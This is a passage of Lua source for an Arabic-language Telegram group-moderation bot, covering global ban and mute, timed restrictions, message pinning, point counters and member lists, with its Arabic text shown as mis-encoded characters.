if text and (text:match('^ุงูุบุงุก ุชูููุฏ @(.*)') or text:match('^ุงูุบุงุก ุชููุฏ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุชูููุฏ @(.*)') or text:match('^ุงูุบุงุก ุชููุฏ @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^ุงูุบุงุก ุชูููุฏ (%d+)') or text:match('^ุงูุบุงุก ุชููุฏ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุชูููุฏ (%d+)') or text:match('ุงูุบุงุก ุชููุฏ (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
end
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('ุญุถุฑ ุนุงู') or text ==('ุญุธุฑ ุนุงู') and ChCheck(msg) then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Rinda..'Rio:BanAll:', result.sender_user_id_)
text = "โ๏ธฐุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ุงูุนุงู โข",callback_data=msg.sender_user_id_..":UnAll:"..result.sender_user_id_},{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^ุญุถุฑ ุนุงู @(.*)') or text:match('^ุญุธุฑ ุนุงู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุถุฑ ุนุงู @(.*)') or text:match('^ุญุธุฑ ุนุงู @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Rinda..'Rio:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^ุญุถุฑ ุนุงู (%d+)') or text:match('^ุญุธุฑ ุนุงู (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุถุฑ ุนุงู (%d+)') or text:match('ุญุธุฑ ุนุงู (%d+)')
if tonumber(user) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevRio:sadd(Rinda..'Rio:BanAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         MuteAll        --
if text ==('ูุชู ุนุงู') and ChCheck(msg) then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
DevRio:sadd(Rinda..'Rio:MuteAll:', result.sender_user_id_)          
text = "โ๏ธฐุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ุงูุนุงู โข",callback_data=msg.sender_user_id_..":UnAll:"..result.sender_user_id_},{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^ูุชู ุนุงู @(.*)') and ChCheck(msg) then
local username = text:match('^ูุชู ุนุงู @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^ูุชู ุนุงู (%d+)') and ChCheck(msg) then
local user = text:match('ูุชู ุนุงู (%d+)')
if tonumber(user) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณูยฒ*", 1, 'md')
return false 
end
DevRio:sadd(Rinda..'Rio:MuteAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         UnAll          --
if text ==('ุงูุบุงุก ุนุงู') or text ==('ุงูุบุงุก ุงูุนุงู') and ChCheck(msg) then
function UnAllReply(extra, result, success)
DevRio:srem(Rinda..'Rio:BanAll:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^ุงูุบุงุก ุนุงู @(.*)') or text:match('^ุงูุบุงุก ุงูุนุงู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุนุงู @(.*)') or text:match('^ุงูุบุงุก ุงูุนุงู @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:BanAll:', result.id_)
DevRio:srem(Rinda..'Rio:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^ุงูุบุงุก ุนุงู (%d+)') or text:match('^ุงูุบุงุก ุงูุนุงู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุนุงู (%d+)') or text:match('ุงูุบุงุก ุงูุนุงู (%d+)')
DevRio:srem(Rinda..'Rio:BanAll:', user)
DevRio:srem(Rinda..'Rio:MuteAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if (text == "ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู" or text == "ููู ููููู ุงูุจูุช" or text == "ุชุบููุฑ ุงููุทูุฑ ุงูุงุณุงุณู" or text == "โข ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โ") and msg.reply_to_message_id_ == 0 and Sudo(msg) and ChCheck(msg) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐูุฌุจ ุงูุชุงูุฏ ุงู ุงููุทูุฑ ุงูุฌุฏูุฏ ุงุฑุณู start ูุฎุงุต ุงูุจูุช ุจุนุฏ ุฐูู ููููู ุงุฑุณุงู ุงูุฏู ุงููุทูุฑ')
DevRio:setex(Rinda.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevRio:get(Rinda.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
send(msg.chat_id_, msg.id_,'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู')
DevRio:del(Rinda.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevRio:del(Rinda.."Rio:EditDev"..msg.sender_user_id_)
DevRio:set(Rinda.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\nโ๏ธฐุงููุนุฑู โข [@'..dp.username_..']' else DevUser = '' end
local Text = 'โ๏ธฐุงูุงูุฏู โข '..dp.id_..DevUser..'\nโ๏ธฐุงูุงุณู โข ['..dp.first_name_..'](tg://user?id='..dp.id_..')\nโ๏ธฐุชู ุญูุธ ุงููุนูููุงุช ุถูุนู\nโ๏ธฐุงุณุชุฎุฏู ุงูุงุฒุฑุงุฑ ููุชุงููุฏ โข โค'
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/setyes"},{text="โข ูุง โข",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"โ๏ธฐุงููุนูููุงุช ุฎุงุทุฆู ูู ุจุงูุชุงูุฏ ูุงุนุฏ ุงููุญุงููู")
DevRio:del(Rinda.."Rio:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^ุฑูุน ูุทู$") and not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevRio:sismember(Rinda..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐูู ูุทู ุดุฑูุน ููู ุจุนุฏ๐น๐") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทุงูู") 
DevRio:sadd(Rinda..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^ุชูุฒูู ูุทู$") and not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevRio:sismember(Rinda..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐูู ููุณ ูุทู ููุชู ุชูุฒููู") 
else
DevRio:srem(Rinda..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทุงูู") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and (text:match('^ุชูููุฏ ุฏูููู (%d+)$') or text:match('^ูุชู ุฏูููู (%d+)$') or text:match('^ุชููุฏ ุฏูููู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ุฏูููู (%d+)$') or text:match('^ูุชู ุฏูููู (%d+)$') or text:match('^ุชููุฏ ุฏูููู (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชููุฏู ููุฏุฉ โข "..mutept.." ุฏ") 
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^ุชูููุฏ ุณุงุนู (%d+)$') or text:match('^ูุชู ุณุงุนู (%d+)$') or text:match('^ุชููุฏ ุณุงุนู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ุณุงุนู (%d+)$') or text:match('^ูุชู ุณุงุนู (%d+)$') or text:match('^ุชููุฏ ุณุงุนู (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชููุฏู ููุฏุฉ โข "..mutept.." ุณ") 
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^ุชูููุฏ ููู (%d+)$') or text:match('^ูุชู ููู (%d+)$') or text:match('^ุชููุฏ ููู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ููู (%d+)$') or text:match('^ูุชู ููู (%d+)$') or text:match('^ุชููุฏ ููู (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชููุฏู ููุฏุฉ โข "..mutept.." ู") 
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุงุถู ุฑุณุงุฆู (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^ุงุถู ุฑุณุงุฆู (%d+)$")
DevRio:set('RindaTeam:'..Rinda..'id:user'..msg.chat_id_,TXT)  
DevRio:setex('RindaTeam:'..Rinda.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ุนุฏุฏ ุงูุฑุณุงุฆู ุงูุงู \nโ๏ธฐุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, "md")
Dev_Rio(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ููููุดุฆูู ููุท', 1, 'md') 
end 
end 
if text and text:match("^ุงุถู ุฑุณุงุฆู (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^ุงุถู ุฑุณุงุฆู (%d+)$")
function Reply(extra, result, success)
DevRio:del(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevRio:incrby(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุถุงูุฉ "..Num..' ุฑุณุงูู', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^ุงุถู ููุงุท (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^ุงุถู ููุงุท (%d+)$")
DevRio:set('RindaTeam:'..Rinda..'ids:user'..msg.chat_id_,TXT)  
DevRio:setex('RindaTeam:'..Rinda.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ุนุฏุฏ ุงูููุงุท ุงูุงู \nโ๏ธฐุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, "md")
Dev_Rio(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ููููุดุฆูู ููุท', 1, 'md') 
end 
end 
if text and text:match("^ุงุถู ููุงุท (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^ุงุถู ููุงุท (%d+)$")
function Reply(extra, result, success)
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุถุงูุฉ "..Num..' ููุทู', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevRio:get(Rinda..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Rinda.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(Rinda.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Rinda..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Rinda.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevRio:sadd(Rinda.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Rinda..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Rinda.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevRio:sadd(Rinda.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^ุชุซุจูุช$") and ChCheck(msg) then 
if DevRio:sismember(Rinda.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevRio:set(Rinda..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุชุซุจูุช ุงูุฑุณุงูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุจูุช ููุณ ุงุฏูู ููุง !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
return false  
end
end,nil)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text == "ุงููููุฒูู" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda..'Rio:VipMem:'..msg.chat_id_)
text = "โ๏ธฐูุงุฆูุฉ ุงููููุฒูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
local username = DevRio:get(Rinda..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
